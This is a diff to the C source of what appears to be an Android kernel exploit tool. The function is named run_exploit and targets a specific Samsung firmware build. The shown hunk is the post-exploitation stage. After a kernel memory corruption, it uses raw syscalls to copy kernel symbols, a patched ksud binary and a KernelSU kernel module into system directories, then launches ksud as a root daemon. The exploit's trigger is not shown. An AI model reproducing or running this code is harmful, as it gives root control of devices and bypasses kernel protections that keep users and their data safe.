@@ -616,63 +616,81 @@ int run_exploit(int argc, char **argv) {
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
 
-    /* Stage files for KernelSU using raw syscalls (libc heap is corrupted) */
+    /* Stage files for KernelSU using raw syscalls (libc heap may be corrupted) */
     pr_success("staging KernelSU files via raw syscalls\n");
 
-    /* Helper: copy file using syscalls only */
-    auto int copy_file_raw(const char *src, const char *dst, int mode);
-    int copy_file_raw(const char *src, const char *dst, int mode) {
-      int fd_src = syscall(SYS_openat, AT_FDCWD, src, O_RDONLY, 0);
-      if (fd_src < 0) return -1;
-      int fd_dst = syscall(SYS_openat, AT_FDCWD, dst,
-                           O_WRONLY | O_CREAT | O_TRUNC, mode);
-      if (fd_dst < 0) {
-        syscall(SYS_close, fd_src);
-        return -1;
-      }
-      char buf[4096];
-      ssize_t n;
-      while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
-        ssize_t written = 0;
-        while (written < n) {
-          ssize_t w = syscall(SYS_write, fd_dst, buf + written,
-                              n - written);
-          if (w < 0) break;
-          written += w;
+    /* Copy kallsyms */
+    int fd_src = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/kallsyms.txt", O_RDONLY, 0);
+    if (fd_src >= 0) {
+      int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/adb/ksym",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
+      if (fd_dst >= 0) {
+        char buf[4096];
+        ssize_t n;
+        while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
+          ssize_t written = 0;
+          while (written < n) {
+            ssize_t w = syscall(SYS_write, fd_dst, buf + written, n - written);
+            if (w < 0) break;
+            written += w;
+          }
         }
+        syscall(SYS_close, fd_dst);
+        pr_success("staged /data/adb/ksym\n");
       }
       syscall(SYS_close, fd_src);
-      syscall(SYS_close, fd_dst);
-      syscall(SYS_fchmodat, AT_FDCWD, dst, mode, 0);
-      return 0;
     }
 
-    if (copy_file_raw("/data/local/tmp/kallsyms.txt",
-                      "/data/adb/ksym", 0644) == 0) {
-      pr_success("staged /data/adb/ksym\n");
-    } else {
-      pr_error("failed to stage kallsyms\n");
+    /* Copy patched ksud */
+    fd_src = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud-patched", O_RDONLY, 0);
+    if (fd_src >= 0) {
+      int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0755);
+      if (fd_dst >= 0) {
+        char buf[4096];
+        ssize_t n;
+        while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
+          ssize_t written = 0;
+          while (written < n) {
+            ssize_t w = syscall(SYS_write, fd_dst, buf + written, n - written);
+            if (w < 0) break;
+            written += w;
+          }
+        }
+        syscall(SYS_close, fd_dst);
+        pr_success("staged /data/local/tmp/ksud\n");
+      }
+      syscall(SYS_close, fd_src);
     }
 
-    if (copy_file_raw("/data/local/tmp/ksud-patched",
-                      "/data/local/tmp/ksud", 0755) == 0) {
-      pr_success("staged /data/local/tmp/ksud\n");
-    } else {
-      pr_error("failed to stage ksud\n");
+    /* Copy KernelSU module */
+    fd_src = syscall(SYS_openat, AT_FDCWD,
+                     "/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
+                     O_RDONLY, 0);
+    if (fd_src >= 0) {
+      int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/kernelsu.ko",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
+      if (fd_dst >= 0) {
+        char buf[4096];
+        ssize_t n;
+        while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
+          ssize_t written = 0;
+          while (written < n) {
+            ssize_t w = syscall(SYS_write, fd_dst, buf + written, n - written);
+            if (w < 0) break;
+            written += w;
+          }
+        }
+        syscall(SYS_close, fd_dst);
+        pr_success("staged /data/local/tmp/kernelsu.ko\n");
+      }
+      syscall(SYS_close, fd_src);
     }
 
-    if (copy_file_raw("/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
-                      "/data/local/tmp/kernelsu.ko", 0644) == 0) {
-      pr_success("staged /data/local/tmp/kernelsu.ko\n");
-    } else {
-      pr_error("failed to stage kernelsu.ko\n");
-    }
-
-    /* Launch ksud as root daemon */
-    pid_t daemon_pid = syscall(SYS_fork);
+    /* Launch ksud daemon */
+    pid_t daemon_pid = fork();
     if (daemon_pid == 0) {
-      /* Child: daemonize */
-      syscall(SYS_setsid);
+      setsid();
       syscall(SYS_close, 0);
       syscall(SYS_close, 1);
       syscall(SYS_close, 2);
